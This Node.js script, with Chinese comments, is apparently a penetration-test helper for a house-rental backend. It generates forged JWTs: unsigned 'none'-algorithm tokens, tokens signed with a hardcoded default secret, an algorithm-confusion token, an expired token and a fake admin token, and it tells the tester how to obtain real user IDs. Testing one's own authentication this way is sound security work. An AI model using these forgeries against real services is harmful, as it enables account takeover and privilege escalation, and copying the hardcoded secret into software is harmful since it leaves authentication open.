/**
 * JWT 伪造Token生成器 — 用于Auth渗透测试
 *
 * 运行: node tests/generate-forged-tokens.js
 * 输出: 将生成的伪造Token设置到 Postman 环境变量中
 */

// jsonwebtoken 安装在 backend/node_modules 中，需要从 backend 目录运行
// 或者直接引用 backend 的模块
const jwt = require('../backend/node_modules/jsonwebtoken');
const crypto = require('crypto');

// 硬编码的默认密钥 (从 backend/config/index.js 获取)
const DEFAULT_SECRET = 'house_rental_secret_key_2024';

// 已知种子用户 (需要数据库中存在)
const VICTIM_USER_ID = '507f1f77bcf86cd799439011'; // 替换为真实用户ID

console.log('╔══════════════════════════════════════════════╗');
console.log('║   JWT 伪造Token生成器                       ║');
console.log('╚══════════════════════════════════════════════╝');
console.log('');

// ────────────────────────────────────────────
// 1. None 算法Token (无签名)
// ────────────────────────────────────────────
function generateNoneAlgToken(userId) {
  const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
  const payload = Buffer.from(JSON.stringify({
    userId: userId,
    iat: Math.floor(Date.now() / 1000),
  })).toString('base64url');
  // None算法: 签名为空
  return `${header}.${payload}.`;
}

// ────────────────────────────────────────────
// 2. 默认密钥 HS256 Token
// ────────────────────────────────────────────
function generateHS256Token(userId, secret) {
  return jwt.sign({ userId: userId }, secret, { algorithm: 'HS256', expiresIn: '1h' });
}

// ────────────────────────────────────────────
// 3. 算法混淆Token (Header声明none, 实际用HS256签名)
// ────────────────────────────────────────────
function generateAlgorithmConfusionToken(userId, secret) {
  // 正常HS256签名，但手动修改header为none
  const legitToken = jwt.sign({ userId: userId }, secret, { algorithm: 'HS256' });
  const parts = legitToken.split('.');
  const fakeHeader = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
  return `${fakeHeader}.${parts[1]}.${parts[2]}`;
}

// ────────────────────────────────────────────
// 4. 过期Token
// ────────────────────────────────────────────
function generateExpiredToken(userId, secret) {
  return jwt.sign({ userId: userId }, secret, { algorithm: 'HS256', expiresIn: '0s' });
}

// ────────────────────────────────────────────
// 5. 伪造成管理员的Token
// ────────────────────────────────────────────
function generateAdminToken(secret) {
  // 尝试伪造管理员userId
  return jwt.sign(
    { userId: '000000000000000000000001', role: 'admin' },
    secret,
    { algorithm: 'HS256', expiresIn: '1h' }
  );
}

// ────────────────────────────────────────────
// 执行生成
// ────────────────────────────────────────────

console.log('📋 请将以下值设置到 Postman Collection Variables:');
console.log('');

const noneToken = generateNoneAlgToken(VICTIM_USER_ID);
console.log('➤ forgedToken_noneAlg (None算法):');
console.log(`  ${noneToken}`);
console.log('');

const hs256Token = generateHS256Token(VICTIM_USER_ID, DEFAULT_SECRET);
console.log('➤ forgedToken_defaultKey (默认密钥HS256):');
console.log(`  ${hs256Token}`);
console.log('');

const confusionToken = generateAlgorithmConfusionToken(VICTIM_USER_ID, DEFAULT_SECRET);
console.log('➤ forgedToken_confusion (算法混淆):');
console.log(`  ${confusionToken}`);
console.log('');

const expiredToken = generateExpiredToken(VICTIM_USER_ID, DEFAULT_SECRET);
console.log('➤ forgedToken_expired (已过期):');
console.log(`  ${expiredToken}`);
console.log('');

const adminToken = generateAdminToken(DEFAULT_SECRET);
console.log('➤ forgedToken_admin (伪造管理员):');
console.log(`  ${adminToken}`);
console.log('');

// ────────────────────────────────────────────
// JWT 解码分析
// ────────────────────────────────────────────
console.log('━'.repeat(50));
console.log('📋 Token解码分析 (不验证签名):');
console.log('');

function analyzeToken(label, token) {
  console.log(`[${label}]`);
  try {
    const parts = token.split('.');
    if (parts.length >= 2) {
      const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
      const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
      console.log(`  Header:  ${JSON.stringify(header)}`);
      console.log(`  Payload: ${JSON.stringify(payload)}`);
      if (parts[2]) {
        console.log(`  Sig:     ${parts[2].substring(0, 20)}...`);
      } else {
        console.log(`  Sig:     (empty — None algorithm)`);
      }
    }
  } catch (e) {
    console.log(`  Error: ${e.message}`);
  }
  console.log('');
}

analyzeToken('None算法', noneToken);
analyzeToken('默认密钥-HS256', hs256Token);
analyzeToken('算法混淆', confusionToken);
analyzeToken('已过期', expiredToken);
analyzeToken('伪造管理员', adminToken);

// ────────────────────────────────────────────
// 验证默认密钥
// ────────────────────────────────────────────
console.log('━'.repeat(50));
console.log('🔑 密钥验证:');
console.log('');

try {
  const legitToken = jwt.sign({ test: true }, DEFAULT_SECRET, { algorithm: 'HS256' });
  const decoded = jwt.verify(legitToken, DEFAULT_SECRET);
  console.log(`  ✅ 密钥 "${DEFAULT_SECRET}" 有效`);
  console.log(`  ✅ HS256签名验证通过`);
  console.log(`  ⚠️  此密钥硬编码在 backend/config/index.js 中`);
  console.log(`  ⚠️  如果.env中未覆盖JWT_SECRET = 攻击者可伪造Token`);
} catch (e) {
  console.log(`  ❌ 密钥验证失败: ${e.message}`);
}

console.log('');
console.log('═══════════════════════════════════════════════');
console.log('  📋 Postman 环境变量设置:');
console.log('');
console.log('  复制以下值到 Postman Collection Variables:');
console.log('  ┌─────────────────────────────────────────┐');
console.log('  │ forgedToken_noneAlg:                    │');
console.log(`  │   ${noneToken.substring(0, 60)}...  │`);
console.log('  │ forgedToken_defaultKey:                 │');
console.log(`  │   ${hs256Token} │`);
console.log('  │ forgedToken_expired:                    │');
console.log(`  │   ${expiredToken} │`);
console.log('  └─────────────────────────────────────────┘');
console.log('');
console.log('  ⚠️  重要提示:');
console.log('  - VICTIM_USER_ID 当前为占位值: 507f1f77bcf86cd799439011');
console.log('  - 默认密钥Token攻击需要替换为数据库中真实存在的用户_id');
console.log('  - 获取方法: 用管理员登陆后 GET /api/admin/users 获取用户列表');
console.log('  - 或直接在 MongoDB 中查询: show dbs → use house_rental → db.users.find()');
console.log('  - None算法攻击不需要真实ID (无签名验证时userId不影响查询结果的关键逻辑)');
console.log('═══════════════════════════════════════════════');
